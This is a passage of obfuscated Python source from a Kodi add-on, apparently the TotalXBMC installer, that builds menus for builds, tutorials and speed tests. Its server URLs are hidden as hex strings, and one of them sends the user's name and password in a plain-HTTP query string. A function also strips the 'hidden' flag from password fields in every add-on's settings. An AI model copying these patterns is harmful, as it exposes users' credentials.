 IiI . ok ( 'TotalXBMC Details for ' + OOOo0 , 'Email: ' + iIIIII11 , 'Unread Messages: ' + OOOOOoO00oo00 + '/' + OO0OO00ooO0 , 'Posts: ' + ooooOOO0 )
 if 49 - 49: O0OOO / I1i1iii * iiIi - Iii1i1I11I . I1i1iii % O0oO
 if 13 - 13: OOO00OoOO00 . Ii1iIIIi1ii . oOOoO0O0O0 . O0oO
def I1Iii ( url , type ) :
 if type == 'communitybuilds' :
  oo0oo00O0O = 'grab_builds'
  if url . endswith ( "visibility=premium" ) :
   Ii ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&reseller=' + urllib . quote ( I1IiiI ) + '&token=' + IIi1IiiiI1Ii + '&visibility=premium' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=reseller_private" ) :
   Ii ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&reseller=' + urllib . quote ( I1IiiI ) + '&token=' + IIi1IiiiI1Ii + '&visibility=reseller_private' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=public" ) :
   Ii ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&visibility=public' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=private" ) :
   Ii ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&visibility=private' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 if type == 'tutorials' :
  oo0oo00O0O = 'grab_tutorials'
 if type == 'hardware' :
  oo0oo00O0O = 'grab_hardware'
 if type == 'addons' :
  oo0oo00O0O = 'grab_addons'
  Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloads&orderx=DESC' , oo0oo00O0O , 'Popular.png' , '' , '' , '' )
 if type == 'hardware' :
  Ii ( 'folder' , '[COLOR=lime]Filter Results[/COLOR]' , url , 'hardware_filter_menu' , 'Filter.png' , '' , '' , '' )
 if type != 'addons' :
  Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloadcount&orderx=DESC' , oo0oo00O0O , 'Popular.png' , '' , '' , '' )
 if type == 'tutorials' or type == 'hardware' :
  Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Newest[/COLOR]' , str ( url ) + '&sortx=Added&orderx=DESC' , oo0oo00O0O , 'Latest.png' , '' , '' , '' )
 else :
  Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Newest[/COLOR]' , str ( url ) + '&sortx=created&orderx=DESC' , oo0oo00O0O , 'Latest.png' , '' , '' , '' )
  Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Recently Updated[/COLOR]' , str ( url ) + '&sortx=updated&orderx=DESC' , oo0oo00O0O , 'Recently_Updated.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue]Sort by A-Z[/COLOR]' , str ( url ) + '&sortx=name&orderx=ASC' , oo0oo00O0O , 'AtoZ.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Z-A[/COLOR]' , str ( url ) + '&sortx=name&orderx=DESC' , oo0oo00O0O , 'ZtoA.png' , '' , '' , '' )
 if type == 'public_CB' :
  Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Genre[/COLOR]' , url , 'genres' , 'Search_Genre.png' , '' , '' , '' )
  Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Country/Language[/COLOR]' , url , 'countries' , 'Search_Country.png' , '' , '' , '' )
  if 35 - 35: II11iII
  if 52 - 52: iiiIi1i1I / ooOO0o
def Iii1IIII1Iii ( ) :
 Ii1ii11IIIi ( 'Speed Test Instructions' , '[COLOR=blue][B]What file should I use: [/B][/COLOR][CR]This function will download a file and will work out your speed based on how long it took to download. You will then be notified of '
 'what quality streams you can expect to stream without buffering. You can choose to download a 10MB, 16MB, 32MB, 64MB or 128MB file to use with the test. Using the larger files will give you a better '
 'indication of how reliable your speeds are but obviously if you have a limited amount of bandwidth allowance you may want to opt for a smaller file.'
 '[CR][CR][COLOR=blue][B]How accurate is this speed test:[/B][/COLOR][CR]Not very accurate at all! As this test is based on downloading a file from a server it\'s reliant on the server not having a go-slow day '
 'but the servers used should be pretty reliable. The 10MB file is hosted on a different server to the others so if you\'re not getting the results expected please try another file. If you have a fast fiber '
 'connection the chances are your speed will show as considerably slower than your real download speed due to the server not being able to send the file as fast as your download speed allows. Essentially the '
 'test results will be limited by the speed of the server but you will at least be able to see if it\'s your connection that\'s causing buffering or if it\'s the host you\'re trying to stream from'
 '[CR][CR][COLOR=blue][B]What is the differnce between Live Streams and Online Video:[/COLOR][/B][CR]When you run the test you\'ll see results based on your speeds and these let you know the quality you should expect to '
 'be able stream with your connection. Live Streams as the title suggests are like traditional TV channels, they are being streamed live so for example if you wanted to watch CNN this would fall into this category. '
 'Online Videos relates to movies, tv shows, youtube clips etc. Basically anything that isn\'t live - if you\'re new to the world of streaming then think of it as On Demand content, this is content that\'s been recorded and stored on the web.'
 '[CR][CR][COLOR=blue][B]Why am I still getting buffering:[/COLOR][/B][CR]The results you get from this test are strictly based on your download speed, there are many other factors that can cause buffering and contrary to popular belief '
 'having a massively fast internet connection will not make any difference to your buffering issues if the server you\'re trying to get the content from is unable to send it fast enough. This can often happen and is usually '
 'down to heavy traffic (too many users accessing the same server). A 10 Mb/s connection should be plenty fast enough for almost all content as it\'s very rare a server can send it any quicker than that.'
 '[CR][CR][COLOR=blue][B]What\'s the difference between MB/s and Mb/s:[/COLOR][/B][CR]A lot of people think the speed they see advertised by their ISP is Megabytes (MB/S) per second - this is not true. Speeds are usually shown as Mb/s '
 'which is Megabit per second - there are 8 of these to a megabyte so if you want to work out how many megabytes per second you\'re getting you need to divide the speed by 8. It may sound sneaky but really it\'s just the unit that has always been used.'
 '[CR][CR]Visit the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B] for more information. A direct link to the buffering thread explaining what you can do to improve your viewing experience can be found at [COLOR=yellow]http://bit.ly/bufferingfix[/COLOR]'
 '[CR][CR]Hope to see you on the forum soon - [COLOR=dodgerblue]whufclee[/COLOR]' )
 if 94 - 94: OOO00OoOO00 . iii11I111 % iii11I111 % iiIi - ooOO0o / i11iIiiIii
def ooo0oOOOO00Oo ( ) :
 Ii ( '' , '[COLOR=blue]Instructions - Read me first[/COLOR]' , 'none' , 'speed_instructions' , 'howto.png' , '' , '' , '' )
 Ii ( '' , 'Download 16MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/16MB.txt' , 'runtest' , 'Download16.png' , '' , '' , '' )
 Ii ( '' , 'Download 32MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/32MB.txt' , 'runtest' , 'Download32.png' , '' , '' , '' )
 Ii ( '' , 'Download 64MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/64MB.txt' , 'runtest' , 'Download64.png' , '' , '' , '' )
 Ii ( '' , 'Download 128MB file - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/128MB.txt' , 'runtest' , 'Download128.png' , '' , '' , '' )
 Ii ( '' , 'Download 10MB file   - [COLOR=yellow]Server 2[/COLOR]' , 'http://www.wswd.net/testdownloadfiles/10MB.zip' , 'runtest' , 'Download10.png' , '' , '' , '' )
 if 48 - 48: I1i1iii + I1i1iii * o0oO / OoO0O00
 if 37 - 37: Ii1iIIIi1ii % Oo000o / O0oO
def i1IIIII1 ( name , url ) :
 Ii1ii11IIIi ( name , url )
 if 13 - 13: II11iII % Ii1iIIIi1ii - I1i1iii / iiIi
 if 9 - 9: Ooo0Oo0 * OoO0O00 - O0oO
def ooO ( ) :
 Ii ( 'folder' , '[COLOR=yellow]Add-on Maintenance/Fixes[/COLOR]' , 'none' , 'addonfixes' , 'Addon_Fixes.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue]Backup/Restore My Content[/COLOR]' , 'none' , 'backup_restore' , 'Backup.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange]Clean/Wipe Options[/COLOR]' , 'none' , 'wipetools' , 'Addon_Fixes.png' , '' , '' , '' )
 Ii ( '' , 'Check My IP Address' , 'none' , 'ipcheck' , 'Check_IP.png' , '' , '' , '' )
 Ii ( '' , 'Check XBMC/Kodi Version' , 'none' , 'xbmcversion' , 'Version_Check.png' , '' , '' , '' )
 Ii ( '' , 'Convert Physical Paths To Special' , Oo , 'fix_special' , 'Special_Paths.png' , '' , '' , '' )
 Ii ( '' , 'Force Close Kodi' , 'url' , 'kill_xbmc' , 'Kill_XBMC.png' , '' , '' , '' )
 Ii ( 'folder' , 'Test My Download Speed' , 'none' , 'speedtest_menu' , 'Speed_Test.png' , '' , '' , '' )
 Ii ( '' , 'Upload Log' , 'none' , 'uploadlog' , 'Log_File.png' , '' , '' , '' )
 Ii ( '' , 'View My Log' , 'none' , 'log' , 'View_Log.png' , '' , '' , '' )
 if 94 - 94: i11iIiiIii . oOOoO0O0O0 + Ii1iIIIi1ii * i1OOO * i1OOO
 if 36 - 36: Oo000o - O0oO . O0oO
def Oo0OOOO0oOoo0 ( url ) :
 Ii ( 'folder' , '[COLOR=yellow]1. Add-on Maintenance[/COLOR]' , str ( url ) + '&type=Maintenance' , 'grab_tutorials' , 'Maintenance.png' , '' , '' , '' )
 Ii ( 'folder' , 'Audio Add-ons' , str ( url ) + '&type=Audio' , 'grab_tutorials' , 'Audio.png' , '' , '' , '' )
 Ii ( 'folder' , 'Picture Add-ons' , str ( url ) + '&type=Pictures' , 'grab_tutorials' , 'Pictures.png' , '' , '' , '' )
 Ii ( 'folder' , 'Program Add-ons' , str ( url ) + '&type=Programs' , 'grab_tutorials' , 'Programs.png' , '' , '' , '' )
 Ii ( 'folder' , 'Video Add-ons' , str ( url ) + '&type=Video' , 'grab_tutorials' , 'Video.png' , '' , '' , '' )
 if 92 - 92: O0oO . iiiIi1i1I - iiiIi1i1I - iii11I111 + i1OOO - O0OOO
 if 30 - 30: O0oO - ooOO0o - II11iII
def ii11 ( url ) :
 oOOooooO = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f5475746f7269616c506f7274616c2f646f776e6c6f6164636f756e742e7068703f69643d2573'
 o00oOoOo0 = binascii . unhexlify ( oOOooooO ) % ( url )
 II1I ( o00oOoOo0 )
 o000Ooo00o00O = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f5475746f7269616c506f7274616c2f7475746f7269616c64657461696c732e7068703f69643d2573'
 i1iIi = binascii . unhexlify ( o000Ooo00o00O ) % ( url )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 O0 = re . compile ( 'name="(.+?)"' ) . findall ( ooOOoooooo )
 I1ii1111Ii = re . compile ( 'author="(.+?)"' ) . findall ( ooOOoooooo )
 iIIi1IIi = re . compile ( 'video_guide1="(.+?)"' ) . findall ( ooOOoooooo )
 i111i11I1ii = re . compile ( 'video_guide2="(.+?)"' ) . findall ( ooOOoooooo )
 OOooo = re . compile ( 'video_guide3="(.+?)"' ) . findall ( ooOOoooooo )
 oo0 = re . compile ( 'video_guide4="(.+?)"' ) . findall ( ooOOoooooo )
 oOOII1i11i1iIi11 = re . compile ( 'video_guide5="(.+?)"' ) . findall ( ooOOoooooo )
 oo0O0oO0O0O = re . compile ( 'video_label1="(.+?)"' ) . findall ( ooOOoooooo )
 oOo0O = re . compile ( 'video_label2="(.+?)"' ) . findall ( ooOOoooooo )
 I11i = re . compile ( 'video_label3="(.+?)"' ) . findall ( ooOOoooooo )
 Iiii1 = re . compile ( 'video_label4="(.+?)"' ) . findall ( ooOOoooooo )
 iIIIiiiI11I = re . compile ( 'video_label5="(.+?)"' ) . findall ( ooOOoooooo )
 ooo0O0O0oo0 = re . compile ( 'about="(.+?)"' ) . findall ( ooOOoooooo )
 oo000oO = re . compile ( 'step1="(.+?)"' ) . findall ( ooOOoooooo )
 IiIiII11i1 = re . compile ( 'step2="(.+?)"' ) . findall ( ooOOoooooo )
 Ii1I1iIiiI1 = re . compile ( 'step3="(.+?)"' ) . findall ( ooOOoooooo )
 o00i111iiIiiIiI = re . compile ( 'step4="(.+?)"' ) . findall ( ooOOoooooo )
 OOooooO = re . compile ( 'step5="(.+?)"' ) . findall ( ooOOoooooo )
 oOoo00 = re . compile ( 'step6="(.+?)"' ) . findall ( ooOOoooooo )
 IIiIi = re . compile ( 'step7="(.+?)"' ) . findall ( ooOOoooooo )
 I1I1IIiiI1 = re . compile ( 'step8="(.+?)"' ) . findall ( ooOOoooooo )
 oooOOO0o0O0 = re . compile ( 'step9="(.+?)"' ) . findall ( ooOOoooooo )
 iiiI1IiI = re . compile ( 'step10="(.+?)"' ) . findall ( ooOOoooooo )
 Ii111IIIIii = re . compile ( 'step11="(.+?)"' ) . findall ( ooOOoooooo )
 O00o = re . compile ( 'step12="(.+?)"' ) . findall ( ooOOoooooo )
 Iii1iIIiii1ii = re . compile ( 'step13="(.+?)"' ) . findall ( ooOOoooooo )
 Ii1iii11I = re . compile ( 'step14="(.+?)"' ) . findall ( ooOOoooooo )
 Ii11iIiiI = re . compile ( 'step15="(.+?)"' ) . findall ( ooOOoooooo )
 ooooOoo0OO = re . compile ( 'screenshot1="(.+?)"' ) . findall ( ooOOoooooo )
 Oo0O0000Oo00o = re . compile ( 'screenshot2="(.+?)"' ) . findall ( ooOOoooooo )
 II1ii = re . compile ( 'screenshot3="(.+?)"' ) . findall ( ooOOoooooo )
 o00iIiiiII = re . compile ( 'screenshot4="(.+?)"' ) . findall ( ooOOoooooo )
 Ii1I1 = re . compile ( 'screenshot5="(.+?)"' ) . findall ( ooOOoooooo )
 OO0ooO0 = re . compile ( 'screenshot6="(.+?)"' ) . findall ( ooOOoooooo )
 OoOooOO0oOOo0O = re . compile ( 'screenshot7="(.+?)"' ) . findall ( ooOOoooooo )
 I1II = re . compile ( 'screenshot8="(.+?)"' ) . findall ( ooOOoooooo )
 iIIi1Ii1III = re . compile ( 'screenshot9="(.+?)"' ) . findall ( ooOOoooooo )
 Oooo00 = re . compile ( 'screenshot10="(.+?)"' ) . findall ( ooOOoooooo )
 iii1II1iI1IIi = re . compile ( 'screenshot11="(.+?)"' ) . findall ( ooOOoooooo )
 Ii11iiI1 = re . compile ( 'screenshot12="(.+?)"' ) . findall ( ooOOoooooo )
 oO0OOOoooO00o0o = re . compile ( 'screenshot13="(.+?)"' ) . findall ( ooOOoooooo )
 I1ii1Ii1 = re . compile ( 'screenshot14="(.+?)"' ) . findall ( ooOOoooooo )
 iiII = re . compile ( 'screenshot15="(.+?)"' ) . findall ( ooOOoooooo )
 if 30 - 30: oO00Oo0o000
 ooooooo00o = O0 [ 0 ] if ( len ( O0 ) > 0 ) else ''
 Oo0o = I1ii1111Ii [ 0 ] if ( len ( I1ii1111Ii ) > 0 ) else ''
 O00Ooo = iIIi1IIi [ 0 ] if ( len ( iIIi1IIi ) > 0 ) else 'None'
 OOOO0OOO = i111i11I1ii [ 0 ] if ( len ( i111i11I1ii ) > 0 ) else 'None'
 i1i1ii = OOooo [ 0 ] if ( len ( OOooo ) > 0 ) else 'None'
 iII1ii1 = oo0 [ 0 ] if ( len ( oo0 ) > 0 ) else 'None'
 I1i1iiiI1 = oOOII1i11i1iIi11 [ 0 ] if ( len ( oOOII1i11i1iIi11 ) > 0 ) else 'None'
 O0OOooOoO = oo0O0oO0O0O [ 0 ] if ( len ( oo0O0oO0O0O ) > 0 ) else 'None'
 i1II1I1Iii1 = oOo0O [ 0 ] if ( len ( oOo0O ) > 0 ) else 'None'
 iiI11Iii = I11i [ 0 ] if ( len ( I11i ) > 0 ) else 'None'
 O0o0O0 = Iiii1 [ 0 ] if ( len ( Iiii1 ) > 0 ) else 'None'
 Ii1II1I11i1 = iIIIiiiI11I [ 0 ] if ( len ( iIIIiiiI11I ) > 0 ) else 'None'
 oOOOoo0o = ooo0O0O0oo0 [ 0 ] if ( len ( ooo0O0O0oo0 ) > 0 ) else ''
 oOooOOOOoo0O = '[CR][CR][COLOR=dodgerblue]Step 1:[/COLOR][CR]' + oo000oO [ 0 ] if ( len ( oo000oO ) > 0 ) else ''
 iIi11ii1 = '[CR][CR][COLOR=dodgerblue]Step 2:[/COLOR][CR]' + IiIiII11i1 [ 0 ] if ( len ( IiIiII11i1 ) > 0 ) else ''
 iIIO0oo = '[CR][CR][COLOR=dodgerblue]Step 3:[/COLOR][CR]' + Ii1I1iIiiI1 [ 0 ] if ( len ( Ii1I1iIiiI1 ) > 0 ) else ''
 iIIi1 = '[CR][CR][COLOR=dodgerblue]Step 4:[/COLOR][CR]' + o00i111iiIiiIiI [ 0 ] if ( len ( o00i111iiIiiIiI ) > 0 ) else ''
 OoOo0O00 = '[CR][CR][COLOR=dodgerblue]Step 5:[/COLOR][CR]' + OOooooO [ 0 ] if ( len ( OOooooO ) > 0 ) else ''
 iI1i1iI1iI = '[CR][CR][COLOR=dodgerblue]Step 6:[/COLOR][CR]' + oOoo00 [ 0 ] if ( len ( oOoo00 ) > 0 ) else ''
 I1IIiIi = '[CR][CR][COLOR=dodgerblue]Step 7:[/COLOR][CR]' + IIiIi [ 0 ] if ( len ( IIiIi ) > 0 ) else ''
 OOOOoOoO = '[CR][CR][COLOR=dodgerblue]Step 8:[/COLOR][CR]' + I1I1IIiiI1 [ 0 ] if ( len ( I1I1IIiiI1 ) > 0 ) else ''
 OO000 = '[CR][CR][COLOR=dodgerblue]Step 9:[/COLOR][CR]' + oooOOO0o0O0 [ 0 ] if ( len ( oooOOO0o0O0 ) > 0 ) else ''
 o0oOoo0o = '[CR][CR][COLOR=dodgerblue]Step 10:[/COLOR][CR]' + iiiI1IiI [ 0 ] if ( len ( iiiI1IiI ) > 0 ) else ''
 IiiIiIIi = '[CR][CR][COLOR=dodgerblue]Step 11:[/COLOR][CR]' + Ii111IIIIii [ 0 ] if ( len ( Ii111IIIIii ) > 0 ) else ''
 O00Oo = '[CR][CR][COLOR=dodgerblue]Step 12:[/COLOR][CR]' + O00o [ 0 ] if ( len ( O00o ) > 0 ) else ''
 oOOoo = '[CR][CR][COLOR=dodgerblue]Step 13:[/COLOR][CR]' + Iii1iIIiii1ii [ 0 ] if ( len ( Iii1iIIiii1ii ) > 0 ) else ''
 oo0O0 = '[CR][CR][COLOR=dodgerblue]Step 14:[/COLOR][CR]' + Ii1iii11I [ 0 ] if ( len ( Ii1iii11I ) > 0 ) else ''
 Ii111Ii11 = '[CR][CR][COLOR=dodgerblue]Step 15:[/COLOR][CR]' + Ii11iIiiI [ 0 ] if ( len ( Ii11iIiiI ) > 0 ) else ''
 oo0oOO = ooooOoo0OO [ 0 ] if ( len ( ooooOoo0OO ) > 0 ) else ''
 i1II11IiiiI = Oo0O0000Oo00o [ 0 ] if ( len ( Oo0O0000Oo00o ) > 0 ) else ''
 IIIi = II1ii [ 0 ] if ( len ( II1ii ) > 0 ) else ''
 Ii1iiI1 = o00iIiiiII [ 0 ] if ( len ( o00iIiiiII ) > 0 ) else ''
 o0ooOOoO0oO0 = Ii1I1 [ 0 ] if ( len ( Ii1I1 ) > 0 ) else ''
 oo00I1IiI1IIiI = OO0ooO0 [ 0 ] if ( len ( OO0ooO0 ) > 0 ) else ''
 oooo = OoOooOO0oOOo0O [ 0 ] if ( len ( OoOooOO0oOOo0O ) > 0 ) else ''
 o0o0oo0Ooo = I1II [ 0 ] if ( len ( I1II ) > 0 ) else ''
 iI1i = iIIi1Ii1III [ 0 ] if ( len ( iIIi1Ii1III ) > 0 ) else ''
 i11I = Oooo00 [ 0 ] if ( len ( Oooo00 ) > 0 ) else ''
 o0oO0o0oo0O0 = iii1II1iI1IIi [ 0 ] if ( len ( iii1II1iI1IIi ) > 0 ) else ''
 O0oo00oOOO0o = Ii11iiI1 [ 0 ] if ( len ( Ii11iiI1 ) > 0 ) else ''
 II1i = oO0OOOoooO00o0o [ 0 ] if ( len ( oO0OOOoooO00o0o ) > 0 ) else ''
 I111iiIIiI1I = I1ii1Ii1 [ 0 ] if ( len ( I1ii1Ii1 ) > 0 ) else ''
 Ii1II = iiII [ 0 ] if ( len ( iiII ) > 0 ) else ''
 IIIII1 = str ( '[COLOR=gold]Author: [/COLOR]' + Oo0o + '[CR][CR][COLOR=lime]About: [/COLOR]' + oOOOoo0o + oOooOOOOoo0O + iIi11ii1 + iIIO0oo + iIIi1 + OoOo0O00 + iI1i1iI1iI + I1IIiIi + OOOOoOoO + OO000 + o0oOoo0o + IiiIiIIi + O00Oo + oOOoo + oo0O0 + Ii111Ii11 )
 if oOooOOOOoo0O != '' :
  Ii ( '' , '[COLOR=yellow][Text Guide][/COLOR]  ' + ooooooo00o , IIIII1 , 'text_guide' , 'How_To.png' , o00 , oOOOoo0o , '' )
 if O00Ooo != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + O0OOooOoO , O00Ooo , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if OOOO0OOO != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + i1II1I1Iii1 , OOOO0OOO , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if i1i1ii != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + iiI11Iii , i1i1ii , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if iII1ii1 != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + O0o0O0 , iII1ii1 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if I1i1iiiI1 != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + Ii1II1I11i1 , I1i1iiiI1 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
  if 44 - 44: iii11I111 / Ooo0Oo0 . iiiIi1i1I + OoOo
  if 32 - 32: O0oO - oO00Oo0o000 * ooOO0o * Oo000o
def O00OOOo ( ) :
 Ii ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , 'tutorials' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime]All Guides[/COLOR] Everything in one place' , '' , 'grab_tutorials' , 'All.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime]XBMC / Kodi[/COLOR] Specific' , '' , 'xbmc_menu' , 'XBMC.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime]XBMC4Xbox[/COLOR] Specific' , '&platform=XBMC4Xbox' , 'xbmc_menu' , 'XBMC4Xbox.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Platform][/COLOR] Android' , '&platform=Android' , 'platform_menu' , 'Android.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Platform][/COLOR] Apple TV' , '&platform=ATV' , 'platform_menu' , 'ATV.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Platform][/COLOR] ATV2 & iOS' , '&platform=iOS' , 'platform_menu' , 'iOS.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Platform][/COLOR] Linux' , '&platform=Linux' , 'platform_menu' , 'Linux.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Platform][/COLOR] Pure Linux' , '&platform=Custom_Linux' , 'platform_menu' , 'Custom_Linux.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Platform][/COLOR] OpenELEC' , '&platform=OpenELEC' , 'platform_menu' , 'OpenELEC.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Platform][/COLOR] OSMC' , '&platform=OSMC' , 'platform_menu' , 'OSMC.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Platform][/COLOR] OSX' , '&platform=OSX' , 'platform_menu' , 'OSX.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Platform][/COLOR] Raspbmc' , '&platform=Raspbmc' , 'platform_menu' , 'Raspbmc.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Platform][/COLOR] Windows' , '&platform=Windows' , 'platform_menu' , 'Windows.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Allwinner Devices' , '&hardware=Allwinner' , 'platform_menu' , 'Allwinner.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Amazon Fire TV' , '&hardware=AFTV' , 'platform_menu' , 'AFTV.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] AMLogic Devices' , '&hardware=AMLogic' , 'platform_menu' , 'AMLogic.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Boxee' , '&hardware=Boxee' , 'platform_menu' , 'Boxee.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Intel Devices' , '&hardware=Intel' , 'platform_menu' , 'Intel.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Raspberry Pi' , '&hardware=RaspberryPi' , 'platform_menu' , 'RaspberryPi.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Rockchip Devices' , '&hardware=Rockchip' , 'platform_menu' , 'Rockchip.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Xbox' , '&hardware=Xbox' , 'platform_menu' , 'Xbox_Original.png' , '' , '' , '' )
 if 37 - 37: Oo000o % Ooo0Oo0 / oO00Oo0o000
def Ii1ii11IIIi ( heading , anounce ) :
 class o0oOooOo0 ( ) :
  WINDOW = 10147
  CONTROL_LABEL = 1
  CONTROL_TEXTBOX = 5
  def __init__ ( self , * args , ** kwargs ) :
   xbmc . executebuiltin ( "ActivateWindow(%d)" % ( self . WINDOW , ) )
   self . win = xbmcgui . Window ( self . WINDOW )
   xbmc . sleep ( 500 )
   self . setControls ( )
  def setControls ( self ) :
   self . win . getControl ( self . CONTROL_LABEL ) . setLabel ( heading )
   try : IiI11i1IIiiI = open ( anounce ) ; oOo0o = IiI11i1IIiiI . read ( )
   except : oOo0o = anounce
   self . win . getControl ( self . CONTROL_TEXTBOX ) . setText ( str ( oOo0o ) )
   return
 o0oOooOo0 ( )
 if 63 - 63: O0oO % oO00Oo0o000 * OoOo - O0oO + ooOO0o % i11iIiiIii
 if 3 - 3: Oo000o . Ii1iIIIi1ii * ooOO0o + OOO00OoOO00 . O0OOO . iii11I111
def oo00o00O0 ( ) :
 IiI = xbmcgui . Dialog ( )
 if IiI . yesno ( "Make Add-on Passwords Visible?" , "This will make all your add-on passwords visible." , "Are you sure you wish to continue?" ) :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( o0oO0 ) :
   for IiI11i1IIiiI in i1i1i1I :
    if IiI11i1IIiiI == 'settings.xml' :
     i1Ii11ii1I = open ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) ) . read ( )
     oOOO00o000o = re . compile ( '<setting id=(.+?)>' ) . findall ( i1Ii11ii1I )
     for OO0oI1iii1i in oOOO00o000o :
      if 'pass' in OO0oI1iii1i :
       if 'option="hidden"' in OO0oI1iii1i :
        try :
         oO0ooOoOO = OO0oI1iii1i . replace ( ' option="hidden"' , '' )
         IiI11i1IIiiI = open ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) , mode = 'w' )
         IiI11i1IIiiI . write ( str ( i1Ii11ii1I ) . replace ( OO0oI1iii1i , oO0ooOoOO ) )
         IiI11i1IIiiI . close ( )
        except :
         pass
  IiI . ok ( "Passwords Are now visible" , "Your passwords will now be visible in your add-on settings." , "If you want to undo this please use the option to" , "hide passwords." )
  if 52 - 52: ooOO0o + O0OOO % iii11I111 % O0OOO % I1i1iii + Iii1i1I11I
  if 51 - 51: ooOO0o % i11iIiiIii
def iI1IIi ( ) :
 if OO0o . getSetting ( 'email' ) == '' :
  IiI = xbmcgui . Dialog ( )
  IiI . ok ( "No Email Address Set" , "A new window will Now open for you to enter your" , "Email address. The logfile will be sent here" )
  OO0o . openSettings ( )
 xbmc . executebuiltin ( 'XBMC.RunScript(special://home/addons/plugin.program.totalinstaller/uploadLog.py)' )
 if 10 - 10: Ooo0Oo0 / OoO0O00 * o0oO % O0OOO + Oo000o
 if 25 - 25: i1OOO - OoO0O00 / O0OOO . Iii1i1I11I % iiIi . o0oO
def Ii1i ( localbuildcheck , localversioncheck , localidcheck ) :
 IIII1i = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f6c6f67696e2f6c6f67696e5f64657461696c732e7068703f757365723d257326706173733d2573'
 i1iIi = binascii . unhexlify ( IIII1i ) % ( OOOo0 , Oooo000o )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oo0O00o0 = re . compile ( 'login_msg="(.+?)"' ) . findall ( ooOOoooooo )
 Oo0oOooOooO = oo0O00o0 [ 0 ] if ( len ( oo0O00o0 ) > 0 ) else ''
 oOOIi1II ( localbuildcheck , localversioncheck , localidcheck , Oo0oOooOooO )
 if 38 - 38: i11iIiiIii - OOO00OoOO00 % O0oO
def iIi1iIiIIII1iII1i ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
